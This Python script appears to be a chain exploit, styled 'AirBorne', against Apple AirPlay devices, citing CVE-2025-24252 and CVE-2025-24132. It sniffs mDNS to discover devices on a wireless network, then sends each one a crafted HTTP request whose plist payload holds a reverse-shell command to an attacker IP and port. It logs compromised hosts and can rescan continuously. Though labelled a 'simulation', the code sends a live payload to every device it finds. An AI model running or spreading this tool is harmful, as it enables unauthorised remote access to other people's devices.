import socket
import time
from scapy.all import *
import threading
import argparse
from datetime import datetime

# === CONFIG ===
iface = "wlan0"  # ← your scanning interface
attacker_ip = "192.168.1.100"
attacker_port = 4444
log_file = "exploited_hosts.log"

discovered_targets = set()

# === BANNER ===
banner = """
 ▗▄▄▖▗▖ ▗▖ ▗▄▖ ▗▄▄▄▖▗▖  ▗▖    ▗▄▄▄▖▗▖  ▗▖▗▄▄▖ ▗▖    ▗▄▖ ▗▄▄▄▖▗▄▄▄▖
▐▌   ▐▌ ▐▌▐▌ ▐▌  █  ▐▛▚▖▐▌    ▐▌    ▝▚▞▘ ▐▌ ▐▌▐▌   ▐▌ ▐▌  █    █  
▐▌   ▐▛▀▜▌▐▛▀▜▌  █  ▐▌ ▝▜▌    ▐▛▀▀▘  ▐▌  ▐▛▀▘ ▐▌   ▐▌ ▐▌  █    █  
▝▚▄▄▖▐▌ ▐▌▐▌ ▐▌▗▄█▄▖▐▌  ▐▌    ▐▙▄▄▖▗▞▘▝▚▖▐▌   ▐▙▄▄▖▝▚▄▞▘▗▄█▄▖  █  
                                                                  
"""

# === STAGE 1: mDNS Discovery ===
def mdns_discover(timeout=10):
    print(f"[*] Scanning for Apple AirPlay devices via mDNS ({timeout}s)...")

    def handle_pkt(pkt):
        if pkt.haslayer(DNSRR) and "_airplay._tcp.local" in str(pkt[DNSRR].rrname):
            ip = pkt[IP].src
            if ip not in discovered_targets:
                print(f"[+] Found AirPlay device: {ip}")
                discovered_targets.add(ip)

    sniff(
        iface=iface,
        filter="udp port 5353",
        prn=handle_pkt,
        timeout=timeout
    )

# === STAGE 2: TCP RCE Simulation ===
def launch_rce(target_ip):
    print(f"[*] Launching CVE-2025-24132 simulated RCE on {target_ip}")

    reverse_shell_cmd = f"/bin/sh -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"

    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>launchctl</key>
    <string>{reverse_shell_cmd}</string>
</dict>
</plist>
"""

    http_request = (
        f"POST /pairing-init HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"Content-Type: application/x-apple-binary-plist\r\n"
        f"Content-Length: {len(xml_payload)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{xml_payload}"
    ).encode()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, 7000))
        s.send(http_request)
        response = s.recv(2048)
        print(f"[+] Response from {target_ip}:\n{response.decode(errors='ignore')}")

        with open(log_file, "a") as log:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log.write(f"{timestamp} - Exploited: {target_ip}\n")

    except Exception as e:
        print(f"[!] Failed to exploit {target_ip}: {e}")
    finally:
        s.close()

# === MAIN ===
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Chain exploit for CVE-2025-24252 + CVE-2025-24132")
    parser.add_argument("--live", action="store_true", help="Run in persistent scanning mode")
    args = parser.parse_args()

    print(banner)
    print("[*] Starting AirBorne chain exploit...")

    try:
        while True:
            discovered_targets.clear()
            mdns_discover(timeout=10)

            if not discovered_targets:
                print("[!] No AirPlay devices found this round.")
            else:
                print(f"[*] Launching RCE simulation on {len(discovered_targets)} target(s)...")
                for ip in discovered_targets:
                    launch_rce(ip)

            if not args.live:
                break

            print("[*] Waiting before next scan cycle...\n")
            time.sleep(5)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting.")
